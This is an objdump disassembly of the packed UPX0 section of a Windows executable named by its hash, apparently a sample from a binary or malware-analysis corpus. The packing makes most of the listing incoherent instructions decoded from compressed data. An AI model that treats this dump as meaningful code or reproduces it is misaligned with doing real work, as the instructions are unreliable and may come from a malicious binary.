
f73f2f1577351d8f701056fb5842024428387bbaea02fb5db2bb96726c3842a0.exe:     file format pei-i386


Disassembly of section UPX0:

00401000 <UPX0>:
  401000:	dec    eax
  401001:	call   DWORD PTR cs:[edi+0x60a0400]
  401008:	push   ebx
  401009:	je     0x40107d
  40100b:	imul   ebp,DWORD PTR [esi+0x67],0xa6005800
  401012:	cmp    ecx,ecx
  401014:	xchg   esi,eax
  401015:	pop    ds
  401016:	add    al,0x24
  401018:	add    esi,DWORD PTR fs:[eax-0x33]
  40101c:	jbe    0x401087
  40101e:	call   0x1be4:0x216c7874
  401025:	and    ah,BYTE PTR [edx]
  401027:	mov    al,0x25
  401029:	mov    ebx,0x54073cff
  40102e:	dec    edi
  40102f:	bound  ebp,QWORD PTR [edx+0x65]
  401032:	arpl   WORD PTR [esp+ecx*1+0x64],si
  401036:	pop    es
  401037:	pusha  
  401038:	das    
  401039:	(bad)  
  40103a:	sti    
  40103b:	(bad)  [ecx+0x79]
  40103e:	jae    0x4010b4
  401040:	gs ins DWORD PTR es:[edi],dx
  401042:	add    BYTE PTR ds:0x490a0f84,cl
  401048:	dec    ecx
  401049:	outs   dx,BYTE PTR ds:[esi]
  40104a:	jb     0x4010b2
  40104c:	popa   
  40104d:	fcomp  st(1)
  40104f:	popa   
  401050:	fbld   TBYTE PTR [ebx+0x65]
  401053:	adc    BYTE PTR [ecx],al
  401055:	(bad)  
  401056:	rol    BYTE PTR [esi],0x46
  401059:	sub    eax,0x3ffdbb0f
  40105e:	add    eax,DWORD PTR [eax]
  401060:	(bad)  
  401061:	dec    esp
  401063:	add    DWORD PTR [esp+0x4],0xfffffff8
  401068:	jmp    0xa3c528f
  40106d:	inc    ebx
  40106e:	and    al,0x74
  401070:	pop    ebp
  401071:	mul    DWORD PTR [eax+edi*1]
  401074:	int3   
  401075:	int3   
  401076:	das    
  401077:	mov    cl,0x3
  401079:	mov    ebx,0xdb07c548
  40107e:	(bad)  
  40107f:	in     al,dx
  401080:	dec    ebx
  401081:	add    edx,ecx
  401083:	or     BYTE PTR [ebx],dl
  401085:	lea    eax,[eax-0xe]
  401088:	adc    eax,0x4c6d7dd2
  40108d:	repz fld QWORD PTR [ecx]
  401090:	dec    esp
  401091:	or     al,0xbc
  401093:	lods   al,BYTE PTR ds:[esi]
  401094:	jnp    0x401108
  401096:	or     al,0x42
  401098:	aam    0x3
  40109a:	loopne 0x40108f
  40109c:	inc    edx
  40109d:	lock std 
  40109f:	ins    BYTE PTR es:[edi],dx
  4010a0:	mov    dl,0x87
  4010a2:	adc    DWORD PTR [esi+eax*8+0x64],edx
  4010a6:	lock mov eax,eax
  4010a9:	jmp    DWORD PTR ds:0xbb064190
  4010af:	inc    eax
  4010b0:	popa   
  4010b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010b2:	pop    es
  4010b3:	mov    al,ds:0x1906419c
  4010b8:	fs cwde 
  4010ba:	xchg   esp,eax
  4010bb:	mov    eax,0x90641906
  4010c0:	nop
  4010c1:	mov    ah,0x8c
  4010c3:	mov    BYTE PTR [ecx],bl
  4010c5:	fs nop
  4010c7:	inc    ecx
  4010c8:	test   BYTE PTR [eax+0x4190647c],al
  4010ce:	push   es
  4010cf:	js     0x401145
  4010d1:	jo     0x401063
  4010d3:	inc    ecx
  4010d4:	push   es
  4010d5:	sbb    DWORD PTR [eax+ebp*2+0x64],ebp
  4010d9:	inc    ecx
  4010da:	push   es
  4010db:	sbb    DWORD PTR [eax+eiz*2-0x50],esp
  4010df:	pop    esp
  4010e0:	push   es
  4010e1:	sbb    DWORD PTR [eax+edx*4+0x58],esp
  4010e5:	push   esp
  4010e6:	enter  0x19c4,0x64
  4010ea:	nop
  4010eb:	inc    ecx
  4010ec:	rcl    BYTE PTR [eax+0x4c],0x64
  4010f0:	nop
  4010f1:	inc    ecx
  4010f2:	push   es
  4010f3:	dec    eax
  4010f4:	fcom   st(4)
  4010f6:	nop
  4010f7:	inc    ecx
  4010f8:	push   es
  4010f9:	sbb    eax,edx
  4010fb:	inc    esp
  4010fc:	inc    eax
  4010fd:	or     eax,0x3c64197f
  401102:	cmp    BYTE PTR [ebx-0x7d],dl
  401105:	les    edi,FWORD PTR [ebx+edi*4-0x12abb9f6]
  40110c:	jmp    ebp
  40110e:	test   eax,ebp
  401110:	rol    DWORD PTR [ecx],1
  401112:	in     al,0xf6
  401114:	sub    al,0x1
  401116:	je     0x40111d
  401118:	movzx  ebx,WORD PTR [esp+0x30]
  40111d:	mov    eax,ebx
  40111f:	sbb    eax,DWORD PTR [ecx+0x6]
  401122:	sbb    esp,ebp
  401124:	inc    esp
  401125:	pop    ebx
  401126:	ret    
  401127:	arpl   WORD PTR [eax+esi*1],si
  40112a:	push   es
  40112b:	sbb    DWORD PTR [eax+edx*4+0x2c],esp
  40112f:	sub    BYTE PTR [eax+eiz*1],ah
  401132:	jbe    0x401198
  401134:	nop
  401135:	inc    ecx
  401136:	sbb    al,0x18
  401138:	hlt    
  401139:	mov    ebx,0xe5cdcb6e
  40113e:	call   DWORD PTR [ebp-0x20]
  401141:	cmp    DWORD PTR [ebx],0x0
  401144:	jne    0x40119f
  401146:	push   0x6a0644
  40114b:	add    ch,BYTE PTR [eax-0x1289f777]
  401151:	(bad)  
  401153:	cmp    DWORD PTR [ebx+eax*1+0x16],0x7
  401158:	xor    eax,eax
  40115a:	mov    DWORD PTR [esp],eax
  40115d:	jmp    0x401138
  40115f:	adc    DWORD PTR [ebx-0x42404eb],ecx
  401165:	out    dx,al
  401166:	sub    al,0xdc
  401168:	mov    DWORD PTR [eax],edx
  40116a:	or     esp,DWORD PTR [ebx-0x2f74e4f6]
  401170:	add    edx,edx
  401172:	mov    ecx,DWORD PTR [esi+ecx*1+0x7f]
  401176:	jg     0x401193
  401178:	jg     0x401107
  40117a:	push   esp
  40117b:	rol    DWORD PTR [ecx+ecx*4],1
  40117e:	push   esp
  40117f:	jne    0x40110c
  401181:	add    ecx,DWORD PTR [ebx]
  401183:	mov    DWORD PTR [edx],ecx
  401185:	pop    es
  401186:	mov    DWORD PTR [ebx],edx
  401188:	inc    eax
  401189:	mov    ebp,0x83fee6bf
  40118e:	clc    
  40118f:	fs jne 0x40116e
  401192:	mov    eax,DWORD PTR [ebx]
  401194:	dec    esi
  401195:	adc    eax,0x3890003
  40119a:	pop    es
  40119b:	ja     0x4011f8
  40119d:	mov    dh,0xd6
  40119f:	push   ecx
  4011a0:	mov    eax,DWORD PTR [edx]
  4011a2:	lds    ecx,FWORD PTR [ecx+ecx*4]
  4011a5:	adc    al,BYTE PTR [eax+0x4]
  4011a8:	retf   
  4011a9:	je     0x40119a
  4011ab:	sti    
  4011ac:	ins    DWORD PTR es:[edi],dx
  4011ad:	push   ebx
  4011ae:	push   esi
  4011af:	push   cs
  4011b0:	clc    
  4011b1:	mov    esi,edx
  4011b3:	mov    ebx,eax
  4011b5:	jg     0x40119f
  4011b7:	xor    BYTE PTR [edi+0x4],bh
  4011ba:	jbe    0x4011d7
  4011bc:	sti    
  4011bd:	mov    dl,0x4
  4011bf:	jmp    0x4011fb
  4011c1:	mov    eax,DWORD PTR [esi]
  4011c3:	dec    edi
  4011c4:	inc    edx
  4011c5:	add    DWORD PTR [esi+0x4],0x39fbdd09
  4011cc:	ja     0x4011da
  4011ce:	push   esp
  4011cf:	inc    esp
  4011d0:	push   ebx
  4011d1:	adc    al,0x24
  4011d3:	xchg   ecx,eax
  4011d4:	push   esp
  4011d5:	pop    eax
  4011d6:	jle    0x401163
  4011d8:	lea    ebx,[ecx+0x6d501e04]
  4011de:	imul   esi,DWORD PTR [eax+0x5e5a5901],0xffffffee
  4011e5:	fnsave [esi+0x125963d7]
  4011eb:	mov    DWORD PTR [eax],ebp
  4011ed:	mov    edx,DWORD PTR [eax]
  4011ef:	mov    ds:0xee976331,eax
  4011f4:	jne    0x4011a8
  4011f6:	add    al,0xa4
  4011f8:	ds or  al,0x4a
  4011fb:	add    al,0xd9
  4011fd:	loopne 0x4011be
  4011ff:	arpl   bp,bp
  401201:	sub    edx,ebp
  401203:	loopne 0x401238
  401205:	(bad)  
  401206:	push   edi
  401207:	push   ebp
  401208:	aaa    
  401209:	(bad)  [ebx-0x1208a493]
  40120f:	lock mov edi,esp
  401212:	jg     0x40119d
  401214:	pop    es
  401215:	mov    eax,DWORD PTR [edx]
  401217:	mov    ebx,0x2c433542
  40121c:	pop    es
  40121d:	mov    ebp,0xc7cfedfb
  401222:	jns    0x40123b
  401224:	mov    edx,DWORD PTR [edx-0x6f]
  401227:	retf   0x2f8b
  40122a:	add    ecx,DWORD PTR [ebp-0x72]
  40122d:	cmp    ecx,eax
  40122f:	jne    0x401249
  401231:	fstp   TBYTE PTR [ecx-0x42e65123]
  401237:	add    edx,eax
  401239:	and    BYTE PTR [eax+0x8],al
  40123c:	sub    eax,0x2f010c06
  401241:	not    BYTE PTR [esi+0x16eb7b7d]
  401247:	add    eax,DWORD PTR [ebx+edi*1]
  40124a:	shl    BYTE PTR [ebp+0xf],1
  40124d:	push   ds
  40124e:	pop    ss
  40124f:	mov    ds:0x7ff7f7b7,eax
  401254:	pop    es
  401255:	cmp    esi,DWORD PTR [edi]
  401257:	jne    0x401207
  401259:	mov    edx,ebx
  40125b:	mov    eax,esi
  40125d:	sbb    dh,BYTE PTR [esp+eax*4-0x40]
  401261:	lock mov eax,0x9df75a59
  401267:	cdq    
  401268:	int3   
  401269:	pop    ebp
  40126a:	pop    edi
  40126b:	pop    DWORD PTR [edi-0x790b1310]
  401271:	mov    esp,0x3235adb9
  401276:	push   0xffffffb7
  401278:	push   es
  401279:	pop    edi
  40127a:	outs   dx,DWORD PTR ds:[esi]
  40127b:	jb     0x5faf8207
  401281:	jo     0x4012a2
  401283:	xor    DWORD PTR [ebx+0x155f033e],ecx
  401289:	stc    
  40128a:	add    edi,DWORD PTR [edx+0x64]
  40128d:	fbstp  TBYTE PTR [edx+0x76]
  401290:	sbb    edi,DWORD PTR [esi-0x21]
  401293:	jne    0x40121c
  401295:	and    DWORD PTR [edi+0x41010e8b],esp
  40129b:	or     BYTE PTR [edi],al
  40129d:	push   ss
  40129e:	sub    DWORD PTR [esi+eax*1],ebp
  4012a1:	and    DWORD PTR [ecx-0x39],0xffffffda
  4012a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012a6:	js     0x401255
  4012a8:	jne    0x401300
  4012aa:	pop    es
  4012ab:	sub    bl,0x4d
  4012ae:	xor    al,0xdd
  4012b0:	test   BYTE PTR [edi],0x7b
  4012b3:	jne    0x4012bf
  4012b5:	sub    bl,ch
  4012b7:	xor    ecx,DWORD PTR [ebx-0x6aa5fce6]
  4012bd:	pop    esp
  4012be:	fnstsw WORD PTR [esi]
  4012c0:	out    dx,al
  4012c1:	jbe    0x4012bf
  4012c3:	retf   
  4012c4:	mov    edi,DWORD PTR [edi+0x2e]
  4012c7:	add    edi,DWORD PTR [ebp+0xc]
  4012ca:	sub    edi,ebx
  4012cc:	mov    DWORD PTR [edx],ecx
  4012ce:	sub    ecx,eax
  4012d0:	jle    0x40131a
  4012d2:	or     al,0x8d
  4012d4:	mov    ebx,0x331ec070
  4012d9:	push   es
  4012da:	lods   al,BYTE PTR ds:[esi]
  4012db:	jmp    0x4012f5
  4012dd:	gs jmp 0x4012f4
  4012e0:	xchg   edx,eax
  4012e1:	mov    ch,0x37
  4012e3:	fild   DWORD PTR [edx+0x3ba00613]
  4012e9:	jne    0xb411248
  4012ef:	mov    ebx,0xb619adb1
  4012f4:	adc    ch,al
  4012f6:	nop
  4012f7:	ret    
  4012f8:	mov    ebx,edx
  4012fa:	inc    edi
  4012fb:	xor    DWORD PTR [edi-0x148100a],0x7d0010ad
  401305:	pop    es
  401306:	mov    esi,0x810ceb06
  40130b:	(bad)  
  40130c:	and    al,0x9
  40130e:	and    esi,0xaeff6c66
  401314:	add    ch,al
  401316:	mov    DWORD PTR [ebx+0x4],esi
  401319:	push   0x1
  40131b:	push   0x560b2000
  401320:	sub    DWORD PTR [ebx+0x58],0xf8f997f8
  401327:	mov    DWORD PTR [ebx],edi
  401329:	test   edi,edi
  40132b:	je     0x401350
  40132d:	sbb    bh,BYTE PTR [eax-0x488f1b6d]
  401333:	lock fmul DWORD PTR [esi]
  401336:	adc    esp,DWORD PTR [eax+eax*4]
  401339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40133a:	outs   dx,DWORD PTR ds:[esi]
  40133b:	push   eax
  40133c:	es xchg cl,ah
  40133f:	mov    al,0xc3
  401341:	shr    BYTE PTR [ebx+eiz*2],0x55
  401345:	lods   al,BYTE PTR ds:[esi]
  401346:	inc    eax
  401347:	mov    esi,0xe8e15fb1
  40134c:	(bad)  
  40134d:	pop    ecx
  40134e:	pusha  
  40134f:	push   0x4
  401351:	dec    edi
  401352:	push   0x4726550b
  401357:	jbe    0x401319
  401359:	push   edx
  40135a:	jne    0x40137b
  40135c:	js     0x401362
  40135e:	add    al,0x98
  401360:	test   eax,0xc4e24cd
  401365:	jbe    0x4012ec
  401367:	inc    edx
  401368:	inc    ebx
  401369:	mov    dl,0xdb
  40136b:	lahf   
  40136c:	call   0x1b4db1ba
  401371:	mov    edi,0xff16c7a6
  401376:	stc    
  401377:	leave  
  401378:	mov    DWORD PTR [esi+0xc],ebx
  40137b:	stos   BYTE PTR es:[edi],al
  40137c:	adc    BYTE PTR [esi],ch
  40137e:	mov    esp,0x2c03851f
  401383:	jno    0x401399
  401385:	mov    eax,ds:0x6beb1e4b
  40138a:	ins    DWORD PTR es:[edi],dx
  40138b:	imul   edi,DWORD PTR [eax+0x1c],0x58c13a26
  401392:	pop    esp
  401393:	sbb    eax,0xd2859437
  401398:	jb     0x4013ec
  40139a:	int    0x79
  40139c:	add    edi,DWORD PTR [eax]
  40139e:	adc    al,0x77
  4013a0:	inc    ebp
  4013a1:	mov    dh,0xeb
  4013a3:	push   ds
  4013a4:	jbe    0x4013b8
  4013a6:	or     BYTE PTR [ebx+0x7e],dh
  4013a9:	or     BYTE PTR [ecx],ah
  4013ab:	push   0x19680304
  4013b0:	popa   
  4013b1:	cwde   
  4013b2:	imul   ebx,ebx,0x6c
  4013b5:	dec    esp
  4013b6:	jbe    0x4013cb
  4013b8:	add    eax,0xdd03fe84
  4013bd:	fcmovnu st,st(1)
  4013bf:	xchg   DWORD PTR [ebp+0x5c70a9a],eax
  4013c5:	pop    ebp
  4013c6:	rcr    dl,0x8f
  4013c9:	lea    edx,[ecx]
  4013cb:	test   dh,bl
  4013cd:	push   edi
  4013ce:	push   es
  4013cf:	mov    edi,0x7175063b
  4013d4:	ficomp DWORD PTR [edx+0x7ab8cba]
  4013da:	dec    ebx
  4013db:	or     al,0xd5
  4013dd:	adc    DWORD PTR [eax-0x3e502488],edi
  4013e3:	leave  
  4013e4:	mov    ds:0x447092b,eax
  4013e9:	mov    ecx,0x3699c618
  4013ee:	xchg   ebp,eax
  4013ef:	leave  
  4013f0:	out    dx,eax
  4013f1:	call   0xd0b4a11c
  4013f6:	clc    
  4013f7:	inc    esi
  4013f8:	leave  
  4013f9:	xor    eax,0xe0738d7d
  4013fe:	loope  0x401381
  401400:	loope  0x401402
  401402:	lock scas eax,DWORD PTR es:[edi]
  401404:	loope  0x4013a1
  401406:	imul   ebp,DWORD PTR [edx],0x4c
  401409:	rcr    BYTE PTR [ecx+eax*4],1
  40140c:	ret    0xfff
  40140f:	cmp    eax,0xdb3812e2
  401414:	test   eax,0x104ddb7b
  401419:	aad    0x9
  40141b:	sub    esp,DWORD PTR [ebx]
  40141d:	daa    
  40141e:	jge    0x401476
  401420:	jl     0x40140e
  401422:	pop    es
  401423:	jmp    0x401480
  401425:	push   es
  401426:	push   es
  401427:	add    ebx,esp
  401429:	mov    ebx,0x453b1b73
  40142e:	lahf   
  40142f:	in     eax,0x10
  401431:	jae    0x401439
  401433:	xor    dl,BYTE PTR [edi]
  401435:	fsub   QWORD PTR [esi-0x21]
  401438:	xlat   BYTE PTR ds:[ebx]
  401439:	adc    ah,dh
  40143b:	jbe    0x4013cc
  40143d:	adc    al,0x1d
  40143f:	add    al,0x73
  401441:	pop    ds
  401442:	arpl   bp,bp
  401444:	int    0x3d
  401446:	mov    ss,WORD PTR [eax]
  401448:	retf   
  401449:	or     ebp,DWORD PTR [ebx]
  40144b:	push   es
  40144c:	push   eax
  40144d:	adc    esp,edi
  40144f:	mov    eax,0x343e91b3
  401454:	push   es
  401455:	jae    0x401442
  401457:	(bad)  
  401459:	pop    es
  40145a:	fadd   QWORD PTR [ebx]
  40145c:	pop    ebx
  40145d:	ret    0x7ec
  401460:	jne    0x4013fe
  401462:	rol    BYTE PTR [edi-0x13939b43],0x91
  401469:	pop    esp
  40146a:	jmp    0x6cc3:0xe5b0c581
  401471:	and    al,0x93
  401473:	pop    esp
  401474:	fdivr  DWORD PTR [ebp-0x6f27beff]
  40147a:	or     eax,0xbc0358c9
  40147f:	add    edi,DWORD PTR [ebx-0x37404995]
  401485:	push   es
  401486:	sbb    eax,DWORD PTR [ebx]
  401488:	jae    0x4014aa
  40148a:	mov    bh,0x40
  40148c:	add    esi,DWORD PTR [esi+0x3090cec2]
  401492:	sahf   
  401493:	add    bh,BYTE PTR [edx+0x61234b5f]
  401499:	lahf   
  40149a:	jnp    0x40147a
  40149c:	fisubr DWORD PTR [ebx-0x43]
  40149f:	mov    eax,ds:0x1f74748c
  4014a4:	hlt    
  4014a5:	mov    ds:0x6c09c03f,al
  4014aa:	sub    DWORD PTR [edi],0x3b418f9d
  4014b0:	jo     0x4014be
  4014b2:	jg     0x4014a1
  4014b4:	retf   
  4014b5:	cwde   
  4014b6:	fdiv   st,st(5)
  4014b8:	arpl   WORD PTR [edi-0x75],si
  4014bb:	(bad)  
  4014bc:	pusha  
  4014bd:	push   es
  4014be:	hlt    
  4014bf:	stos   DWORD PTR es:[edi],eax
  4014c0:	pop    edi
  4014c1:	mov    ecx,DWORD PTR [edx+0x17]
  4014c4:	add    DWORD PTR [ecx-0x1c],edi
  4014c7:	jmp    0xed4730e5
  4014cc:	pop    es
  4014cd:	inc    edi
  4014ce:	mov    eax,DWORD PTR [edi]
  4014d0:	push   cs
  4014d1:	jb     0x4014aa
  4014d3:	cmp    edi,DWORD PTR [esi]
  4014d5:	js     0x40153f
  4014d7:	das    
  4014d8:	jne    0x401495
  4014da:	add    eax,0xce9a050
  4014df:	cld    
  4014e0:	cmp    BYTE PTR [esi],ah
  4014e2:	lea    eax,ds:0xf804c511
  4014e8:	mov    dh,0xb1
  4014ea:	inc    ecx
  4014eb:	outs   dx,BYTE PTR ds:[esi]
  4014ec:	xchg   edx,eax
  4014ed:	adc    edx,DWORD PTR [ebx+0x2]
  4014f0:	add    ebx,DWORD PTR [edi+0x2c]
  4014f3:	lods   eax,DWORD PTR ds:[esi]
  4014f4:	pop    ss
  4014f5:	mov    dl,0x71
  4014f7:	jae    0x40151c
  4014f9:	or     al,0x89
  4014fb:	or     al,0x8b
  4014fd:	and    esp,DWORD PTR [edi+0xd]
  401500:	lods   eax,DWORD PTR ds:[esi]
  401501:	cli    
  401502:	inc    ecx
  401503:	addr16 add al,0xac
  401506:	(bad)  
  401507:	out    0xfc,eax
  401509:	lods   al,BYTE PTR ds:[esi]
  40150a:	lea    esp,[ecx]
  40150c:	out    0x6,eax
  40150e:	push   cs
  40150f:	cmp    ebp,DWORD PTR [esi]
  401511:	je     0x40151a
  401513:	fwait
  401514:	cmp    DWORD PTR [ebx+0x753be96c],edi
  40151a:	out    dx,eax
  40151b:	push   es
  40151c:	pop    edi
  40151d:	call   0x8ec6:0x3eb9fe0f
  401524:	pushf  
  401525:	lods   al,BYTE PTR ds:[esi]
  401526:	mov    edx,edi
  401528:	sub    edx,DWORD PTR [eax-0x66]
  40152b:	int    0xe
  40152d:	add    eax,DWORD PTR [ecx+0xc]
  401530:	int    0xf6
  401532:	loopne 0x40151f
  401534:	jns    0x40153e
  401536:	fwait
  401537:	mov    ah,0x78
  401539:	popf   
  40153a:	xor    edx,DWORD PTR [eax]
  40153c:	jl     0x401509
  40153e:	gs pop ebp
  401540:	ins    DWORD PTR es:[edi],dx
  401541:	or     BYTE PTR [edi-0x74ea60f0],bl
  401547:	fadd   DWORD PTR [eax-0x14]
  40154a:	mov    cl,0xc
  40154c:	retf   0xf3a2
  40154f:	xor    edx,edx
  401551:	test   eax,0xb9145dbd
  401556:	in     eax,dx
  401557:	or     dl,BYTE PTR [ebx+0x42]
  40155a:	push   ebp
  40155b:	push   ecx
  40155c:	imul   eax,DWORD PTR [eax+0x3446580c],0xffffffa1
  401563:	xchg   ecx,eax
  401564:	push   ds
  401565:	popa   
  401566:	push   sp
  401568:	dec    edx
  401569:	jmp    0x4015bd
  40156b:	jl     0x40151a
  40156d:	cmp    DWORD PTR [eax],edi
  40156f:	idiv   BYTE PTR [ebx]
  401571:	fnsave [ebp+0x42]
  401574:	scas   eax,DWORD PTR es:[edi]
  401575:	jg     0x4015b2
  401577:	and    al,0x3e
  401579:	pop    eax
  40157a:	sub    ebp,0xffffff83
  40157d:	or     BYTE PTR [edx-0x48],dh
  401580:	cmp    BYTE PTR [edi+0x2e],dl
  401583:	imul   edx,DWORD PTR [eax],0x78
  401586:	addr16 loope 0x4015c9
  401589:	js     0x4015a1
  40158b:	or     ch,BYTE PTR [ecx+0x19]
  40158e:	ror    DWORD PTR [esi],0x99
  401591:	adc    BYTE PTR [edi],al
  401593:	push   ebx
  401594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401595:	cmp    BYTE PTR [ebx],ah
  401597:	sbb    al,0x69
  401599:	lea    ecx,fs:[eax-0x63b61ece]
  4015a0:	mov    fs,WORD PTR [esi+0x4e]
  4015a3:	sub    BYTE PTR [ecx+0x762727c0],dl
  4015a9:	xchg   bl,bl
  4015ab:	cmp    esi,DWORD PTR [esi+esi*2]
  4015ae:	pop    edi
  4015af:	jmp    0x2a5440c2
  4015b4:	lea    ebx,[ebp+0x74c76f5]
  4015ba:	mov    ah,0xdd
  4015bc:	xchg   edi,eax
  4015bd:	hlt    
  4015be:	retf   0xc78b
  4015c1:	ins    BYTE PTR es:[edi],dx
  4015c2:	mov    dl,0x77
  4015c4:	es test ebx,ebx
  4015c7:	je     0x4015e8
  4015c9:	mov    ebx,0x9827a0c5
  4015cf:	bound  edi,QWORD PTR [eax+0x7ea9ad2]
  4015d5:	adc    al,0x8b
  4015d7:	ror    ecx,0xe
  4015da:	add    edi,DWORD PTR [ebx]
  4015dc:	mov    ebx,gs
  4015de:	xchg   bp,ax
  4015e0:	shl    BYTE PTR [esi-0x7f],0x83
  4015e4:	xlat   BYTE PTR ds:[ebx]
  4015e5:	cmp    ah,ch
  4015e7:	push   ecx
  4015e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015e9:	push   ebp
  4015ea:	test   BYTE PTR [edi-0x9],0xdf
  4015ee:	sub    cl,BYTE PTR [ebx]
  4015f0:	mov    esp,0x6432ff64
  4015f5:	mov    DWORD PTR [edx],esp
  4015f7:	push   0xc8c2c428
  4015fc:	cmp    BYTE PTR ds:0xb260490a,0xed
  401603:	push   eax
  401604:	inc    ebp
  401605:	aas    
  401606:	or     dl,BYTE PTR [edx]
  401608:	rcr    BYTE PTR [ecx],1
  40160a:	icebp  
  40160b:	enter  0xbe43,0x6c
  40160f:	or     esp,esi
  401611:	push   esi
  401612:	and    BYTE PTR [eax-0x8],ch
  401615:	pmaxub mm3,mm6
  401618:	frstor [esi+eax*2-0x5d]
  40161c:	adc    eax,0x53d831c
  401621:	inc    ecx
  401622:	inc    eax
  401623:	mov    eax,0xf03fc003
  401628:	push   ds
  401629:	not    BYTE PTR ds:0xf482220d
  40162f:	inc    eax
  401630:	cmp    eax,0x735bc401
  401635:	fild   QWORD PTR [edx+0x45c7ec75]
  40163b:	cld    
  40163c:	adc    al,0xcf
  40163e:	push   es
  40163f:	mov    edx,DWORD PTR [ebp-0x4]
  401642:	lahf   
  401643:	jle    0x401633
  401645:	in     al,dx
  401646:	mov    esp,0x41071008
  40164b:	adc    dh,al
  40164d:	inc    edx
  40164e:	mov    esp,0x6df65701
  401653:	outs   dx,DWORD PTR ds:[esi]
  401654:	mov    cl,0x5a
  401656:	pop    ecx
  401657:	pop    ecx
  401658:	pushf  
  401659:	adc    BYTE PTR [edi-0x5127683d],ah
  40165f:	lock sti 
  401661:	mov    es,ebx
  401663:	add    esp,DWORD PTR [edi]
  401665:	xor    bl,ch
  401667:	in     eax,0xa0
  401669:	sub    eax,0xd76b5d59
  40166e:	ja     0x401611
  401670:	cmp    eax,0xf29c213
  401675:	repz test al,ch
  401678:	jle    0x40162a
  40167a:	gs stc 
  40167c:	xor    eax,0xc00ce643
  401681:	xor    BYTE PTR [eax],ah
  401683:	fmul   QWORD PTR [ebp+0x6b059ef4]
  401689:	add    BYTE PTR [ecx+0x4b0c4a5],ah
  40168f:	jle    0x4016e7
  401691:	lods   al,BYTE PTR ds:[esi]
  401692:	xor    al,dh
  401694:	sbb    BYTE PTR [ebp-0x8],al
  401697:	jmp    0x4016b4
  401699:	xchg   bh,dh
  40169b:	and    eax,0x870b3681
  4016a0:	or     eax,DWORD PTR [eax]
  4016a2:	sbb    al,0x8b
  4016a4:	test   bl,bl
  4016a6:	and    al,0xdc
  4016a8:	pop    es
  4016a9:	jne    0x401686
  4016ab:	and    al,0x7a
  4016ad:	(bad)  
  4016ae:	push   ss
  4016af:	mov    eax,ds:0x83ef48a1
  4016b4:	jge    0x4016b2
  4016b6:	add    BYTE PTR [ecx+eiz*1+0x0],dh
  4016ba:	pop    es
  4016bb:	ss jae 0x4016cf
  4016be:	push   eax
  4016bf:	or     DWORD PTR [eax+eiz*1+0x75],esi
  4016c3:	and    DWORD PTR [eax-0x6204fe4],eax
  4016c9:	or     al,0xc7
  4016cb:	add    esi,DWORD PTR [esi-0x21]
  4016ce:	inc    ecx
  4016cf:	es loopne 0x4016ad
  4016d2:	pop    ecx
  4016d3:	call   DWORD PTR [ebx-0x3]
  4016d6:	cmp    eax,DWORD PTR ds:0x1f43de84
  4016dc:	inc    ecx
  4016dd:	jne    0x4016e8
  4016df:	add    BYTE PTR ds:0xe3be090a,dl
  4016e5:	add    ebx,DWORD PTR [edi]
  4016e7:	push   eax
  4016e8:	or     BYTE PTR [ecx+0x4e7f67fa],al
  4016ee:	ins    BYTE PTR es:[edi],dx
  4016ef:	jne    0x401708
  4016f1:	test   edx,edx
  4016f3:	jns    0x4016e1
  4016f5:	xchg   eax,esi
  4016f7:	aaa    
  4016f8:	or     eax,0xfac103c2
  4016fd:	add    ah,BYTE PTR [ecx-0x140b6f61]
  401703:	dec    ebx
  401704:	push   ss
  401705:	adc    DWORD PTR [edi],0xfffffffa
  401708:	mov    ebp,0x8b170d8b
  40170d:	sbb    al,0x2d
  40170f:	pop    esp
  401710:	xchg   ecx,eax
  401711:	hlt    
  401712:	les    eax,FWORD PTR [esi+0x6d3421d0]
  401718:	adc    BYTE PTR [esi-0x227add2f],al
  40171e:	pop    ecx
  40171f:	jmp    0x40173a
  401721:	sbb    dl,dl
  401723:	pop    ebx
  401724:	cmp    al,0xc6
  401726:	addr16 iret 
  401728:	push   ecx
  401729:	mov    ecx,esp
  40172b:	add    esp,DWORD PTR [eax]
  40172d:	mov    DWORD PTR [ecx],edx
  40172f:	cmp    cl,BYTE PTR [ebx-0x5e448229]
  401735:	adc    DWORD PTR [edx+0x3b],eax
  401738:	ret    0x9e72
  40173b:	sbb    DWORD PTR [ebx],eax
  40173d:	push   ebx
  40173e:	or     al,0x8
  401740:	sbb    eax,0x7ed02611
  401745:	pop    ebx
  401746:	adc    bl,BYTE PTR [ecx]
  401748:	mov    edx,0xf9113b20
  40174d:	cmp    eax,0x3c779ddc
  401752:	cmp    BYTE PTR [edi+0x5a018b01],ch
  401758:	inc    ebx
  401759:	retf   0xe983
  40175c:	jbe    0x401755
  40175e:	fisttp DWORD PTR [ebx]
  401760:	loopne 0x40177e
  401762:	add    DWORD PTR [ecx+0x10fa838f],ecx
  401768:	jl     0x40177d
  40176a:	(bad)  
  40176b:	mov    DWORD PTR [edx],0xb7372407
  401771:	popa   
  401772:	stos   DWORD PTR es:[edi],eax
  401773:	add    cl,dl
  401775:	push   es
  401776:	setl   BYTE PTR [esi]
  401779:	pop    ss
  40177a:	add    al,0x7c
  40177c:	mov    ch,0x53
  40177e:	mov    bh,0x83
  401780:	btc    ecx,ecx
  401783:	add    dl,BYTE PTR [esi]
  401785:	mov    DWORD PTR [ebx-0x3e4496fc],esp
  40178b:	xlat   BYTE PTR ds:[ebx]
  40178c:	push   ss
  40178d:	call   DWORD PTR [eax-0x54]
  401790:	pop    ss
  401791:	sub    edx,0xffffff97
  401794:	adc    dh,BYTE PTR [ebp-0x12]
  401797:	mov    eax,ds:0x74fc696e
  40179c:	jg     0x4017a8
  40179e:	add    edi,edi
  4017a0:	mov    al,0x3a
  4017a2:	outs   dx,BYTE PTR ds:[esi]
  4017a3:	rcr    edi,cl
  4017a5:	fcom   QWORD PTR [eax+edi*8]
  4017a8:	pop    edi
  4017a9:	cmp    cl,BYTE PTR [esp+edi*2]
  4017ac:	push   cs
  4017ad:	or     edx,0x2
  4017b0:	mov    dh,0xc0
  4017b2:	add    al,0x14
  4017b4:	cmp    DWORD PTR [edi-0x37],0x4ddc0dd8
  4017bb:	or     al,BYTE PTR [ebx]
  4017bd:	ret    0x2083
  4017c0:	inc    bl
  4017c2:	movsx  ecx,BYTE PTR [edi+0x17]
  4017c6:	ins    BYTE PTR es:[edi],dx
  4017c7:	push   ecx
  4017c8:	dec    eax
  4017c9:	sbb    ecx,esp
  4017cb:	cmp    ecx,0xfbed7405
